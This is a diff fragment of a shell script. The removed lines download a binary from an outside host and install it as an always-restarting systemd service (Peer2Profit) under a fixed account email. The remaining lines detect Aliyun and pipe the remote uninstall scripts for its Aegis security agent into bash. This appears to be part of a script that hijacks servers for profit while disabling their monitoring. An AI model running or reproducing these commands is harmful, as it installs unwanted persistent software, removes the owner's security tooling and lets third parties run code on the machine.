@@ -1,22 +1,3 @@
-cd /opt
-wget https://img.zeruns.tech/down/p2pclient
-chmod +x p2pclient
-
-cat >/etc/systemd/system/Peer2Profit.service <<EOL
-[Unit]
-Description=Peer2Profit
-[Service]
-Type=simple
-ExecStart=/opt/p2pclient -l u223110@163.com
-TimeoutSec=15
-Restart=always
-[Install]
-WantedBy=multi-user.target
-EOL
-
-systemctl enable Peer2Profit
-systemctl start Peer2Profit
-
 if ps aux | grep -i '[a]liyun'; then
   curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
   curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
